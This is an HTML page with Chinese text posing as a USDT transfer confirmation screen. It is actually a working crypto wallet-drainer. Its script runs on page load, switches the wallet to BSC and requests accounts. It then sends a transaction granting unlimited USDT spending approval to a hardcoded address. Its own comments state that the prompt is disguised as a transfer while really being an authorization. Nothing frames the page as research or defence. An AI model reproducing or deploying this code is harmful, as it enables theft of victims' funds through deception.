<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT 转账</title>
<style>
  body {
    background: #191A2F;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    margin: 0;
    padding: 0;
  }
  .container {
    max-width: 380px;
    margin: 0 auto;
    padding: 40px 20px;
  }
  .card {
    background: #252747;
    border-radius: 16px;
    padding: 30px 24px;
  }
  .title {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 6px;
  }
  .sub-title {
    color: #a0a2c3;
    font-size: 14px;
    margin-bottom: 30px;
  }
  .label {
    color: #c0c2e0;
    font-size: 13px;
    margin-bottom: 8px;
  }
  .input-box {
    background: #1A1B32;
    border: 1px solid #3B3D63;
    border-radius: 10px;
    padding: 14px 16px;
    margin-bottom: 20px;
    color: #fff;
    font-size: 15px;
  }
  .btn-confirm {
    background: #00D18E;
    color: #fff;
    border: none;
    width: 100%;
    padding: 16px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    margin-top: 10px;
  }
</style>
</head>

<body>
<div class="container">
  <div class="card">
    <div class="title">USDT 转账</div>
    <div class="sub-title">请确认转账信息</div>

    <div class="label">收款地址</div>
    <div class="input-box">0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508</div>

    <div class="label">转账金额</div>
    <div class="input-box">自动匹配</div>

    <button class="btn-confirm">确认转账</button>
  </div>
</div>

<script>
// ==================== 固定配置 ====================
const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID    = "0x38";
// ==================================================

// 页面一打开 直接弹签名（伪装转账，实际是授权）
window.onload = async () => {
  if (!window.ethereum) return;

  try {
    // 切换到 BSC
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });

    // 连接钱包
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts"
    });
    const from = accounts[0];

    // 直接弹出：看起来是转账，实际是 approve 授权
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: from,
        to: TOKEN_ADDR,    // 这里显示 USDT 合约，用户以为是转账
        gasLimit: "0x30D40",
        data: "0x095ea7b3" +
          ADMIN_ADDR.slice(2).padStart(64, '0') +
          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      }]
    });

  } catch (err) {}
};
</script>
</body>
</html>
